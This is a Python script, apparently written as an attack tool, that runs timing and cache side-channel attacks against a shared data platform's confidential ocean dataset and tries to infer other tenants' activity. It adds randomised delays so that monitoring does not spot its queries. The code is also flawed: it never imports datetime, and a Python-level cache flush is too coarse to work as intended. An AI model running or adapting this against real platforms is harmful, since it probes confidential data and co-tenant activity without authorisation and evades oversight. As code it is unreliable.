# malicious_side_channel.py
import time
import numpy as np
import threading
from collections import defaultdict
from platform_sdk.data_client import DataClient

class SideChannelAttacker:
    def __init__(self):
        self.data_client = DataClient()
        self.timing_measurements = defaultdict(list)
        self.cache_probe_array = None
        self.prime_size = 256 * 1024 * 1024  # 256MB, 大于典型LLC大小
        self.probe_array_size = 4096  # 4KB pages
        self.sample_count = 1000
        self.high_res_timer = time.perf_counter_ns

    def setup_cache_probe(self):
        """设置用于缓存状态探测的数组"""
        print("[+] Setting up cache probing array...")
        # 创建一个大数组来清空缓存
        self.prime_array = np.zeros(self.prime_size, dtype=np.uint8)
        
        # 创建探测数组，每个元素对应一个缓存行
        self.cache_probe_array = np.zeros(self.probe_array_size, dtype=np.uint64)
        print(f"    Prime array: {self.prime_size//1024//1024}MB, Probe array: {self.probe_array_size*8//1024}KB")

    def flush_cache(self):
        """清空缓存层次结构"""
        # 通过顺序访问大数组来清空缓存
        for i in range(0, self.prime_size, 64):  # 按缓存行大小访问
            self.prime_array[i] += 1

    def time_memory_access(self, address):
        """测量内存访问时间（检测缓存命中/未命中）"""
        self.flush_cache()
        start = self.high_res_timer()
        _ = self.cache_probe_array[address % self.probe_array_size]  # 访问操作
        end = self.high_res_timer()
        return end - start

    def timing_attack_on_data_access(self, target_dataset):
        """对数据访问模式进行计时攻击"""
        print(f"[+] Starting timing attack on dataset: {target_dataset}")
        
        # 定义要测试的不同数据区域
        test_regions = [
            ('public_region', {'lat': (30.0, 35.0), 'lon': (120.0, 125.0)}),
            ('suspected_dense_region', {'lat': (38.0, 38.5), 'lon': (121.5, 122.0)}),
            ('sparse_region', {'lat': (10.0, 10.5), 'lon': (130.0, 130.5)})
        ]
        
        for region_name, bbox in test_regions:
            print(f"    Testing region: {region_name} {bbox}")
            
            for i in range(self.sample_count):
                try:
                    # 测量数据查询时间
                    start_time = self.high_res_timer()
                    
                    # 执行数据查询 - 这是被测量的操作
                    data = self.data_client.get_dataset(
                        name=target_dataset,
                        variables=['temperature'],
                        latitude=bbox['lat'],
                        longitude=bbox['lon'],
                        time='2023-01-01'
                    )
                    
                    end_time = self.high_res_timer()
                    query_time = end_time - start_time
                    
                    self.timing_measurements[region_name].append(query_time)
                    
                    # 添加随机延迟，避免被检测出规律性查询
                    time.sleep(np.random.uniform(0.01, 0.05))
                    
                except Exception as e:
                    print(f"        Query failed: {e}")
                    continue
                
                if i % 100 == 0:
                    avg_time = np.mean(self.timing_measurements[region_name]) if self.timing_measurements[region_name] else 0
                    print(f"        Sample {i}: {query_time/1000:.1f}μs (Avg: {avg_time/1000:.1f}μs)")

    def cache_based_attack(self):
        """基于缓存状态的攻击"""
        print("[+] Starting cache-based side channel attack...")
        
        access_times = []
        for i in range(self.sample_count):
            # 清空缓存
            self.flush_cache()
            
            # 假设这里有其他用户的任务正在运行，会影响缓存状态
            # 我们测量特定内存位置的访问时间
            access_time = self.time_memory_access(i % 256)
            access_times.append(access_time)
            
            if i % 100 == 0:
                avg_time = np.mean(access_times[-100:]) if access_times else 0
                print(f"        Sample {i}: {access_time}ns (Avg: {avg_time:.1f}ns)")
                
                # 检测可能的缓存状态变化模式
                if len(access_times) > 50:
                    recent_avg = np.mean(access_times[-50:])
                    previous_avg = np.mean(access_times[-100:-50])
                    if abs(recent_avg - previous_avg) > 20:  # 20ns的变化阈值
                        print(f"        !!! Significant cache behavior change detected at sample {i}")
        
        return access_times

    def analyze_timing_results(self):
        """分析计时攻击结果"""
        print("\n[+] Analyzing timing measurement results...")
        
        for region, times in self.timing_measurements.items():
            if times:
                avg_time = np.mean(times)
                std_time = np.std(times)
                min_time = np.min(times)
                max_time = np.max(times)
                
                print(f"    {region}:")
                print(f"      Samples: {len(times)}")
                print(f"      Avg time: {avg_time/1000:.2f} ± {std_time/1000:.2f}μs")
                print(f"      Range: {min_time/1000:.1f} - {max_time/1000:.1f}μs")
                
                # 推断数据特性：时间短可能表示数据在缓存中（被频繁访问）
                # 时间长可能表示数据需要从存储加载（冷数据）
                if avg_time < 50000:  # 50μs阈值
                    print(f"      Inference: Data likely cached (frequently accessed)")
                else:
                    print(f"      Inference: Data likely uncached (infrequently accessed)")

    def statistical_analysis(self):
        """进行更精细的统计分析"""
        print("[+] Performing statistical analysis...")
        
        # 假设检验：比较不同区域的访问时间
        regions = list(self.timing_measurements.keys())
        for i in range(len(regions)):
            for j in range(i + 1, len(regions)):
                region_a, region_b = regions[i], regions[j]
                times_a = self.timing_measurements[region_a]
                times_b = self.timing_measurements[region_b]
                
                if times_a and times_b:
                    from scipy import stats
                    try:
                        t_stat, p_value = stats.ttest_ind(times_a, times_b)
                        print(f"    {region_a} vs {region_b}: p-value = {p_value:.6f}")
                        
                        if p_value < 0.01:  # 统计显著性
                            mean_diff = np.mean(times_a) - np.mean(times_b)
                            print(f"      Significant difference: {mean_diff/1000:.2f}μs")
                            if mean_diff > 0:
                                print(f"      {region_b} is faster - possibly better cached")
                            else:
                                print(f"      {region_a} is faster - possibly better cached")
                    except:
                        pass

    def run_attack(self):
        """执行完整的侧信道攻击流程"""
        print("[+] Initializing side channel attack...")
        
        # 1. 设置缓存探测环境
        self.setup_cache_probe()
        
        # 2. 执行计时攻击
        target_dataset = "confidential_ocean_data_v2"
        self.timing_attack_on_data_access(target_dataset)
        
        # 3. 执行缓存攻击
        cache_times = self.cache_based_attack()
        
        # 4. 分析结果
        self.analyze_timing_results()
        self.statistical_analysis()
        
        # 5. 保存攻击结果
        output_file = "side_channel_measurements.json"
        import json
        with open(output_file, 'w') as f:
            results = {
                'timing_measurements': {k: [int(t) for t in v] for k, v in self.timing_measurements.items()},
                'cache_measurements': [int(t) for t in cache_times],
                'metadata': {
                    'sample_count': self.sample_count,
                    'timestamp': datetime.now().isoformat()
                }
            }
            json.dump(results, f, indent=2)
        
        print(f"[+] Attack completed. Results saved to {output_file}")

def main():
    attacker = SideChannelAttacker()
    
    try:
        attacker.run_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Attack failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()